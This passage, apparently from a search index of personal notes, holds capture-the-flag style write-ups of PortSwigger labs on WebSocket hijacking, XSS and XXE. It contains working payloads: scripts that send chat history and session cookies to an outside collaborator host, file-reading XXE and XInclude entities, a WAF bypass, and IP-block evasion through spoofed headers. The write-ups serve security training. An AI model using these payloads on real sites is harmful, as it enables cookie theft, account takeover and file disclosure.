vulnerabilities"],"tags":["websockets","xss"]},{"location":"Resources/Labs/PortSwigger/WebSockets/websocket-lab-1/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>If websockets are in use, check to see how the data is being handled. If it's being reflected without output encoding, it may be possible to abuse to achieve XSS.</p>","path":["Resources","Labs","PortSwigger","WebSockets","Manipulating WebSocket messages to exploit vulnerabilities"],"tags":["websockets","xss"]},{"location":"Resources/Labs/PortSwigger/WebSockets/websockets-lab-2/","level":1,"title":"Cross-site WebSocket hijacking","text":"","path":["Resources","Labs","PortSwigger","WebSockets","Cross-site WebSocket hijacking"],"tags":["websockets"]},{"location":"Resources/Labs/PortSwigger/WebSockets/websockets-lab-2/#instructions","level":2,"title":"Instructions","text":"<p>This online shop has a live chat feature implemented using WebSockets.</p> <p>To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account.</p>","path":["Resources","Labs","PortSwigger","WebSockets","Cross-site WebSocket hijacking"],"tags":["websockets"]},{"location":"Resources/Labs/PortSwigger/WebSockets/websockets-lab-2/#solution","level":2,"title":"Solution","text":"<p>Note that the application has a live chat functionality.</p> <p></p> <p>The websockets history in Burp shows the flow of the application. It looks like a READY message is sent from the client to the server before the server returns the chat history to the client.</p> <p></p> <p>Additionally, it's important to note that the application uses a session cookie with the SameSite attribute set to None. </p> <p></p> <p>We can create some JavaScript that will establish a websocket connection and automatically send a \"READY\" message whenever a victim visits our site. This JS will also exfiltrate the victim's chat history to our collaborator server.</p> Working payload<pre><code>&lt;script&gt;\n  let ws = new WebSocket(\n    \"wss://0ac1008a03b7059382c6067b00ad0072.web-security-academy.net/chat\"\n  );\n  ws.onopen = () =&gt; {\n    ws.send(\"READY\");\n  };\n  ws.onmessage = (Event) =&gt; {\n    fetch(\"https://6mtx0le322vg1un5gl0u84azgqmha7yw.oastify.com\", {\n      method: \"POST\",\n      mode: \"no-cors\",\n      body: Event.data,\n    });\n  };\n&lt;/script&gt;\n</code></pre> <p>After delivering this to the victim, we get a series of POST requests to our collaborator; one of which contains carlos' password.</p> <p></p>","path":["Resources","Labs","PortSwigger","WebSockets","Cross-site WebSocket hijacking"],"tags":["websockets"]},{"location":"Resources/Labs/PortSwigger/WebSockets/websockets-lab-2/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>If we have an XSS or other way to coerce a victim into visiting our website, it may be possible to abuse web sockets if:</p> <ul> <li>The websocket handshake relies on cookies</li> <li>There are no CSRF tokens or other unpredictable parameters</li> </ul>","path":["Resources","Labs","PortSwigger","WebSockets","Cross-site WebSocket hijacking"],"tags":["websockets"]},{"location":"Resources/Labs/PortSwigger/WebSockets/websockets-lab-3/","level":1,"title":"Manipulating the WebSocket handshake to exploit vulnerabilities","text":"","path":["Resources","Labs","PortSwigger","WebSockets","Manipulating the WebSocket handshake to exploit vulnerabilities"],"tags":["websockets","xss"]},{"location":"Resources/Labs/PortSwigger/WebSockets/websockets-lab-3/#instructions","level":2,"title":"Instructions","text":"<p>This online shop has a live chat feature implemented using WebSockets.</p> <p>It has an aggressive but flawed XSS filter.</p> <p>To solve the lab, use a WebSocket message to trigger an <code>alert()</code> popup in the support agent's browser.</p>","path":["Resources","Labs","PortSwigger","WebSockets","Manipulating the WebSocket handshake to exploit vulnerabilities"],"tags":["websockets","xss"]},{"location":"Resources/Labs/PortSwigger/WebSockets/websockets-lab-3/#solution","level":2,"title":"Solution","text":"<p>Notice that if we try to send any kind of malicious string our IP address gets blocked. </p> <p>I added a rule to add an <code>X-Forwarded-For: 1.1.1.1</code> header to all my requests to get around this. </p> <p>Also notice that if we try to enter our XSS payload directly in the chat window that it is properly output encoded, thereby causing the payload to not fire. </p> <p></p> <p>Now, if we intercept the websocket chat request and modify it in the proxy, we get our alert box.</p> <p></p> <p></p> <p>And the lab is solved.</p>","path":["Resources","Labs","PortSwigger","WebSockets","Manipulating the WebSocket handshake to exploit vulnerabilities"],"tags":["websockets","xss"]},{"location":"Resources/Labs/PortSwigger/WebSockets/websockets-lab-3/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Try different IP headers to get around IP-based blocks. Also, if the XSS payload is not working, try various obfuscated payloads since the filter may just be looking for \"alert\" or something similar, but not variations in casing, encoding, etc.</p>","path":["Resources","Labs","PortSwigger","WebSockets","Manipulating the WebSocket handshake to exploit vulnerabilities"],"tags":["websockets","xss"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-01/","level":1,"title":"Reflected XSS into HTML context with nothing encoded","text":"","path":["Resources","Labs","PortSwigger","XSS","Reflected XSS into HTML context with nothing encoded"],"tags":["xss","reflected"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-01/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.</p> <p>To solve the lab, perform a cross-site scripting attack that calls the <code>alert</code> function.</p>","path":["Resources","Labs","PortSwigger","XSS","Reflected XSS into HTML context with nothing encoded"],"tags":["xss","reflected"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-01/#solution","level":2,"title":"Solution","text":"<p>Whatever we enter into the search box is reflected in an <code>&lt;h1&gt;</code> tag with nothing escaped. </p> <p></p> <p>If we send the following payload, we get an alert triggered showing the domain from which the payload executed.</p> Working payload<pre><code>?search=test123&lt;script&gt;alert(document.domain)&lt;/script&gt;\n</code></pre> <p></p> <p>This solves the lab.</p>","path":["Resources","Labs","PortSwigger","XSS","Reflected XSS into HTML context with nothing encoded"],"tags":["xss","reflected"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-01/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Always check the contect in which input is reflected. Use \"View as HTML\" to see what/how it's being output encoded.</p>","path":["Resources","Labs","PortSwigger","XSS","Reflected XSS into HTML context with nothing encoded"],"tags":["xss","reflected"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-02/","level":1,"title":"Stored XSS into HTML context with nothing encoded","text":"","path":["Resources","Labs","PortSwigger","XSS","Stored XSS into HTML context with nothing encoded"],"tags":["xss","stored"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-02/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a stored cross-site scripting vulnerability in the comment functionality.</p> <p>To solve this lab, submit a comment that calls the <code>alert</code> function when the blog post is viewed.</p>","path":["Resources","Labs","PortSwigger","XSS","Stored XSS into HTML context with nothing encoded"],"tags":["xss","stored"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-02/#solution","level":2,"title":"Solution","text":"<p>Each blog post has a comment functionality.</p> <p></p> <p>Looks like the comment and name are reflected.</p> <p>Send the following POST request with an <code>&lt;h1&gt;</code> tag in the comment and note how the input is rendered on the page.</p> Sending h1 tag in a comment<pre><code>POST /post/comment HTTP/1.1\nHost: 0a4700d404e205bf803a17c8001f00a9.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 144\nOrigin: https://0a4700d404e205bf803a17c8001f00a9.web-security-academy.net\nConnection: keep-alive\nReferer: https://0a4700d404e205bf803a17c8001f00a9.web-security-academy.net/post?postId=1\nCookie: session=1Oc6n6AAZG3OhrdEC8woZsui5qFqtYJw\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nX-PwnFox-Color: magenta\nPriority: u=0, i\n\ncsrf=E8ExWUxE9oTs3LBObfSW4eH6HNyZi1bQ&amp;postId=1&amp;comment=%3Ch1%3Etest123comment%3C%2Fh1%3E&amp;name=test123name&amp;email=test123email%40test.com&amp;website=\n</code></pre> <p></p> <p>Note that the h1 is rendered on the page, so we know there is HTML injection. </p> <p>Send the following payload in the comment field</p> Working payload<pre><code>test123&lt;script&gt;alert(document.domain)&lt;/script&gt;\n</code></pre> <p>Then observe that the alert triggers when we navigate back to the blog page. </p> <p></p> <p>This solves the lab. </p>","path":["Resources","Labs","PortSwigger","XSS","Stored XSS into HTML context with nothing encoded"],"tags":["xss","stored"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-02/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Pay particular attention to any functionality that allows users to store input on the server-side (e.g., comments). Always test these thoroughly.</p>","path":["Resources","Labs","PortSwigger","XSS","Stored XSS into HTML context with nothing encoded"],"tags":["xss","stored"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-03/","level":1,"title":"DOM XSS in <code>document.write</code> sink using source <code>location.search</code>","text":"","path":["Resources","Labs","PortSwigger","XSS","DOM XSS in document.write sink using source location.search"],"tags":["xss","dom"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-03/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript <code>document.write</code> function, which writes data out to the page. The <code>document.write</code> function is called with data from <code>location.search</code>, which you can control using the website URL.</p> <p>To solve this lab, perform a cross-site scripting attack that calls the <code>alert</code> function.</p>","path":["Resources","Labs","PortSwigger","XSS","DOM XSS in document.write sink using source location.search"],"tags":["xss","dom"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-03/#solution","level":2,"title":"Solution","text":"<p>What we enter in the search box is reflected in an <code>&lt;h1&gt;</code> tag.</p> <p></p> <p>Note the script on the page:</p> How is search input handled?<pre><code>function trackSearch(query) {\n    document.write('&lt;img src=\"/resources/images/tracker.gif?searchTerms='+query+'\"&gt;');\n}\nvar query = (new URLSearchParams(window.location.search)).get('search');\nif(query) {\n    trackSearch(query);\n}                    \n</code></pre> <p>On line 2, we can see that the <code>trackSearch</code> function directly concatenates the search query into an <code>&lt;img&gt;</code> tag. It looks like we'll need to escape the double quotes and add another attribute to trigger our XSS. </p> <p>Here we can see what we pass to the <code>search</code> parameter is reflected in the img tag in the DOM.</p> <p></p> <p>The following payload breaks out of the img tag and triggers the alert box to complete this lab. </p> Working payload<pre><code>/?search=test123\"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;\n</code></pre> <p></p>","path":["Resources","Labs","PortSwigger","XSS","DOM XSS in document.write sink using source location.search"],"tags":["xss","dom"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-03/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Pay close attention to client side code to see if there is an indication of how user input is being handled. Try to track the input (source) through to a function that might not be handling it safely (sink). </p>","path":["Resources","Labs","PortSwigger","XSS","DOM XSS in document.write sink using source location.search"],"tags":["xss","dom"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-08/","level":1,"title":"Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded","text":"","path":["Resources","Labs","PortSwigger","XSS","Stored XSS into anchor href attribute with double quotes HTML-encoded"],"tags":["xss","filter-bypass"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-08/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the <code>alert</code> function when the comment author name is clicked.</p>","path":["Resources","Labs","PortSwigger","XSS","Stored XSS into anchor href attribute with double quotes HTML-encoded"],"tags":["xss","filter-bypass"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-08/#solution","level":2,"title":"Solution","text":"<p>Go to a blog post and fill out a comment. Use unique strings so it's easy to search for your string. Note that your website input is reflected in an <code>&lt;a&gt;</code> tag in the <code>href</code> attribute.</p> <p></p> <p>However, notice that if we try to escape that context, it doesn't work because double quotes and angle brackets are output encoded.</p> <p></p> <p>We can use the <code>javascript</code> scheme to bypass this restriction and get our alert function to trigger by entering the following payload in the website field:</p> Use this as the website in the comment form<pre><code>javascript:alert(document.domain)\n</code></pre> <p></p>","path":["Resources","Labs","PortSwigger","XSS","Stored XSS into anchor href attribute with double quotes HTML-encoded"],"tags":["xss","filter-bypass"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-08/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Always double check the context in which our input is reflected. It might be in more than one place. If certain characters are output encoded, try different payloads to see if you can find one that bypasses the restrictions in place. </p>","path":["Resources","Labs","PortSwigger","XSS","Stored XSS into anchor href attribute with double quotes HTML-encoded"],"tags":["xss","filter-bypass"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-09/","level":1,"title":"Reflected XSS into a JavaScript string with angle brackets HTML encoded","text":"","path":["Resources","Labs","PortSwigger","XSS","Reflected XSS into a JavaScript string with angle brackets HTML encoded"],"tags":["xss"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-09/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the <code>alert</code>function.</p>","path":["Resources","Labs","PortSwigger","XSS","Reflected XSS into a JavaScript string with angle brackets HTML encoded"],"tags":["xss"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-09/#solution","level":2,"title":"Solution","text":"<p>Note that when we enter a term in the search bar, that term is reflected inside of a <code>&lt;script&gt;</code> tag. </p> <p></p> <p>Since this is being reflected inside of JavaScript already, it is not necessary to add another script tag, we can just try to break out of the current context and add a new argument to the existing tag. </p> <p>Try the following string:</p> Working payload<pre><code>test123';alert(document.domain);//\n</code></pre> <p></p> <p>This triggers our alert and solves the lab. </p>","path":["Resources","Labs","PortSwigger","XSS","Reflected XSS into a JavaScript string with angle brackets HTML encoded"],"tags":["xss"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-09/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>If input is reflected in a JS string, try to just add another function to the existing script tag. It may be necessary to comment out the remainder of the string to avoid errors. </p>","path":["Resources","Labs","PortSwigger","XSS","Reflected XSS into a JavaScript string with angle brackets HTML encoded"],"tags":["xss"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-10/","level":1,"title":"DOM XSS in <code>document.write</code> sink using source <code>location.search</code> inside a select element","text":"","path":["Resources","Labs","PortSwigger","XSS","DOM XSS in document.write sink using source location.search inside a select element"],"tags":["xss","dom"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-10/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript <code>document.write</code> function, which writes data out to the page. The <code>document.write</code>function is called with data from <code>location.search</code> which you can control using the website URL. The data is enclosed within a select element.</p> <p>To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the <code>alert</code> function.</p>","path":["Resources","Labs","PortSwigger","XSS","DOM XSS in document.write sink using source location.search inside a select element"],"tags":["xss","dom"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-10/#solution","level":2,"title":"Solution","text":"<p>Notice that this application has functionality to check the stock of certain items at particular locations. Sending the following request adds a new selection option:</p> Initial request<pre><code>https://0a38004604c0bef0826597e1003e0010.web-security-academy.net/product?productId=1&amp;storeId=Test123\n</code></pre> <p>Note that our input is reflected inside of a <code>&lt;option&gt;</code> tag.</p> <p></p> <p>Also observe the following JavaScript:</p> <p></p> <p>This is taking input from the <code>storeId</code> parameter, and is writing it to the page inside of an option tag using the <code>document.write</code> function. </p> <p>We can break out of this context using the following string:</p> Working payload<pre><code>https://0a38004604c0bef0826597e1003e0010.web-security-academy.net/product?productId=1&amp;storeId=Test123%3C/option%3E%3C/select%3E%3Cscript%3Ealert(document.domain)%3C/script%3E\n</code></pre> <p>Our alert fires and the lab is solved. </p> <p></p>","path":["Resources","Labs","PortSwigger","XSS","DOM XSS in document.write sink using source location.search inside a select element"],"tags":["xss","dom"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-10/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Pay particular attention to client-side JavaScript code, as it can give a good indication of user input that's being handled in unsafe ways. If you find a dangerous sink, try to escape the current context to get the payload to fire. </p>","path":["Resources","Labs","PortSwigger","XSS","DOM XSS in document.write sink using source location.search inside a select element"],"tags":["xss","dom"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-14/","level":1,"title":"Reflected XSS into HTML context with most tags and attributes blocked","text":"","path":["Resources","Labs","PortSwigger","XSS","Reflected XSS into HTML context with most tags and attributes blocked"],"tags":["xss","filter-bypass"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-14/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.</p> <p>To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the <code>print()</code>function.</p>","path":["Resources","Labs","PortSwigger","XSS","Reflected XSS into HTML context with most tags and attributes blocked"],"tags":["xss","filter-bypass"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-14/#solution","level":2,"title":"Solution","text":"<p>Note that our search term is reflected in an <code>&lt;h1&gt;</code> tag.</p> <p></p> <p>If we try to break out of that h1 tag and use an img tag to trigger the print() function, then we get \"Tag is not allowed\".</p> <p></p> <p>Here, we can use PortSwigger's XSS cheatsheet to copy a list of all tags over to automate/intruder to see what tags might bypass this filter. </p> <p>Here we see that <code>&lt;body&gt;</code> and custom tags are allowed. </p> <p></p> <p>Trying the <code>&lt;body&gt;</code> tag we see that it is not blocked.</p> <p></p> <p>Repeating a similar process with the attributes, we find that several are allowed, however many require user interaction. One that does not is <code>onresize</code>.</p> <p></p> <p>Now that we have a tag and attribute that are allowed, we can create a payload to deliver to the victim.</p> <p>The following payload works.</p> Working payload that triggers the print() function<pre><code>&lt;iframe src=\"https://0a3f00c7035f099b809903b40067002e.web-security-academy.net/?search=test123&lt;body%20onresize=print()&gt;\" onload=this.document.style.width=\"1em\"&gt;\n</code></pre> <p>This calls the print() function on resize, and then automatically sets the iframe width to \"1em\", thereby triggering the print function and solving the lab.</p>","path":["Resources","Labs","PortSwigger","XSS","Reflected XSS into HTML context with most tags and attributes blocked"],"tags":["xss","filter-bypass"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-14/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>If common payloads are not working, try fuzzing for other tags and/or attributes that might not be blocked. </p>","path":["Resources","Labs","PortSwigger","XSS","Reflected XSS into HTML context with most tags and attributes blocked"],"tags":["xss","filter-bypass"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-22/","level":1,"title":"Exploiting cross-site scripting to steal cookies","text":"","path":["Resources","Labs","PortSwigger","XSS","Exploiting cross-site scripting to steal cookies"],"tags":["xss","cookies","fetch"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-22/#instructions","level":2,"title":"Instructions","text":"<p>This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.</p> <p>Burp Pro is required for this lab</p>","path":["Resources","Labs","PortSwigger","XSS","Exploiting cross-site scripting to steal cookies"],"tags":["xss","cookies","fetch"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-22/#solution","level":2,"title":"Solution","text":"<p>We can confirm there is stored XSS in the comment field of the blog post, as shown below.</p> Stored XSS POST request hl_lines=<pre><code>POST /post/comment HTTP/2\nHost: 0ac000ed033d3aac92547181004600b4.web-security-academy.net\nCookie: session=epx1wSsiy7ikqoo5ibi87AoLsatokgW4\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 193\nOrigin: https://0ac000ed033d3aac92547181004600b4.web-security-academy.net\nReferer: https://0ac000ed033d3aac92547181004600b4.web-security-academy.net/post?postId=6\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nPriority: u=0, i\nTe: trailers\n\ncsrf=3t9HKniXOqfQheHTknXahYTSjzQyYXj6&amp;postId=6&amp;comment=test123comment%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;name=test123name&amp;email=test123email%40test.com&amp;website=https%3A%2F%2Ftest123site.net\n</code></pre> <p></p> <p>We can use the following JS to try to trigger a POST request from any victim who visits this page to our collaborator, containing their cookie in the POST body.</p> <pre><code>&lt;script&gt;fetch('https://0cda2v39k3dgv46kgz11vmeg177yvojd.oastify.com', { method: 'POST', mode: 'no-cors', body: document.cookie});&lt;/script&gt;\n</code></pre> <p>After posting a comment with that payload in the comment field, we get a POST request to collaborator with the session cookie in the body.</p> <p></p> <p>There might be several requests depending on how much you had to tinker with this (a lot for me), but you're looking for the one with the secret cookie in it. </p> <p>Send a previous request from burp to repeater and replace the old cookie with this entire string and send the request to solve the lab. </p> <p></p>","path":["Resources","Labs","PortSwigger","XSS","Exploiting cross-site scripting to steal cookies"],"tags":["xss","cookies","fetch"]},{"location":"Resources/Labs/PortSwigger/XSS/xss-lab-22/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>Check for OOB interactions on any stored XSS. NOTE FOR ME: Learn the Fetch API syntax well.</p>","path":["Resources","Labs","PortSwigger","XSS","Exploiting cross-site scripting to steal cookies"],"tags":["xss","cookies","fetch"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-1/","level":1,"title":"Exploiting XXE using external entities to retrieve files","text":"","path":["Resources","Labs","PortSwigger","XXE","Exploiting XXE using external entities to retrieve files"],"tags":["xxe","xml"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-1/#instructions","level":2,"title":"Instructions","text":"<p>This lab has a \"Check stock\" feature that parses XML input and returns any unexpected values in the response.</p> <p>To solve the lab, inject an XML external entity to retrieve the contents of the <code>/etc/passwd</code> file.</p>","path":["Resources","Labs","PortSwigger","XXE","Exploiting XXE using external entities to retrieve files"],"tags":["xxe","xml"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-1/#solution","level":2,"title":"Solution","text":"<p>Note that when we check the stock of an item, the request includes XML. This suggests that the application must be using some kind of XML parser. </p> XML in the stock check request<pre><code>POST /product/stock HTTP/1.1\nHost: 0a09001e0461781882731b9f004000f0.web-security-academy.net\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br, zstd\nReferer: https://0a09001e0461781882731b9f004000f0.web-security-academy.net/product?productId=1\nContent-Type: application/xml\nContent-Length: 107\nOrigin: https://0a09001e0461781882731b9f004000f0.web-security-academy.net\nConnection: keep-alive\nCookie: session=6tT90kdAO6RN4ciqUEzZQstIwHix8Tka\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nX-PwnFox-Color: orange\nPriority: u=0\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;\n</code></pre> <p>We can try a payload from hacktricks or payloadsallthethings to retrieve the <code>/etc/passwd</code> file. </p> <p>https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html#xml-basics</p> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#classic-xxe</p> <p>In this case, we can use the following payload to get the contents of the <code>/etc/passwd</code> file:</p> Working payload<pre><code>&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;\n</code></pre> <p></p> <p>This solves the lab.</p>","path":["Resources","Labs","PortSwigger","XXE","Exploiting XXE using external entities to retrieve files"],"tags":["xxe","xml"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-3/","level":1,"title":"Blind XXE with out-of-band interaction","text":"","path":["Resources","Labs","PortSwigger","XXE","Blind XXE with out-of-band interaction"],"tags":["xxe","OAST"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-3/#instructions","level":2,"title":"Instructions","text":"<p>This lab has a \"Check stock\" feature that parses XML input but does not display the result.</p> <p>You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.</p> <p>To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.</p>","path":["Resources","Labs","PortSwigger","XXE","Blind XXE with out-of-band interaction"],"tags":["xxe","OAST"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-3/#solution","level":2,"title":"Solution","text":"<p>Note that the check stock request includes XML.</p> Check stock request<pre><code>POST /product/stock HTTP/2\nHost: 0a5300fa04b61e4380a7d0fe00ee0012.web-security-academy.net\nCookie: session=Dqty6ZZ4zeULrDRtlrmyQsgrGYoOMr51\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://0a5300fa04b61e4380a7d0fe00ee0012.web-security-academy.net/product?productId=1\nContent-Type: application/xml\nContent-Length: 107\nOrigin: https://0a5300fa04b61e4380a7d0fe00ee0012.web-security-academy.net\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nPriority: u=0\nTe: trailers\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;\n</code></pre> <p>Since all we want to do is trigger a DNS lookup, we can use the following payload in the request.</p> Working payload<pre><code>&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net'&gt;]&gt;\n&lt;root&gt;&amp;test;&lt;/root&gt;\n</code></pre> <p>If we include that in the request and place the <code>&amp;test;</code> in the storeId parameter, then we get a DNS lookup to our collaborator instance. </p> <p></p> <p></p> <p>That solves this lab.</p>","path":["Resources","Labs","PortSwigger","XXE","Blind XXE with out-of-band interaction"],"tags":["xxe","OAST"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-3/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>If you're not getting anything back from your XXE payloads, see if you can trigger an OOB interaction. This may indicate potential to leverage XXE for an SSRF attack.</p>","path":["Resources","Labs","PortSwigger","XXE","Blind XXE with out-of-band interaction"],"tags":["xxe","OAST"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-7/","level":1,"title":"Exploiting XInclude to retrieve files","text":"","path":["Resources","Labs","PortSwigger","XXE","Exploiting XInclude to retrieve files"],"tags":["xxe","xinclude"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-7/#instructions","level":2,"title":"Instructions","text":"<p>This lab has a \"Check stock\" feature that embeds the user input inside a server-side XML document that is subsequently parsed.</p> <p>Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.</p> <p>To solve the lab, inject an <code>XInclude</code> statement to retrieve the contents of the <code>/etc/passwd</code> file.</p> Hint <p>By default, <code>XInclude</code> will try to parse the included document as XML. Since <code>/etc/passwd</code> isn't valid XML, you will need to add an extra attribute to the <code>XInclude</code> directive to change this behavior.</p>","path":["Resources","Labs","PortSwigger","XXE","Exploiting XInclude to retrieve files"],"tags":["xxe","xinclude"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-7/#solution","level":2,"title":"Solution","text":"<p>We can use the following xinclude payload to retrieve the contents of the <code>/etc/passwd</code> file. </p> Working payload<pre><code>&lt;foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"&gt;\n&lt;xi:include parse=\"text\" href=\"file:///etc/passwd\"/&gt;&lt;/foo&gt;\n</code></pre> <p>In repeater, place that payload as the value of the <code>productId</code> parameter and send the request. </p> <p></p> <p>This gets the <code>/etc/passwd</code> contents and solves the lab.</p>","path":["Resources","Labs","PortSwigger","XXE","Exploiting XInclude to retrieve files"],"tags":["xxe","xinclude"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-7/#lesson-learned","level":2,"title":"Lesson learned","text":"<p>If I cannot control the entire XML document, try XInclude.</p>","path":["Resources","Labs","PortSwigger","XXE","Exploiting XInclude to retrieve files"],"tags":["xxe","xinclude"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-8/","level":1,"title":"Exploiting XXE via image file upload","text":"","path":["Resources","Labs","PortSwigger","XXE","Exploiting XXE via image file upload"],"tags":["xxe","file-upload"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-8/#instructions","level":2,"title":"Instructions","text":"<p>This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.</p> <p>To solve the lab, upload an image that displays the contents of the <code>/etc/hostname</code> file after processing. Then use the \"Submit solution\" button to submit the value of the server hostname.</p>","path":["Resources","Labs","PortSwigger","XXE","Exploiting XXE via image file upload"],"tags":["xxe","file-upload"]},{"location":"Resources/Labs/PortSwigger/XXE/xxe-lab-8/#solution","level":2,"title":"Solution","text":"<p>Note that on this lab, each blog post has a file upload functionality in the comments section where a user can upload an avatar image. </p> <p></p> <p>We can use the following payload to create an svg image 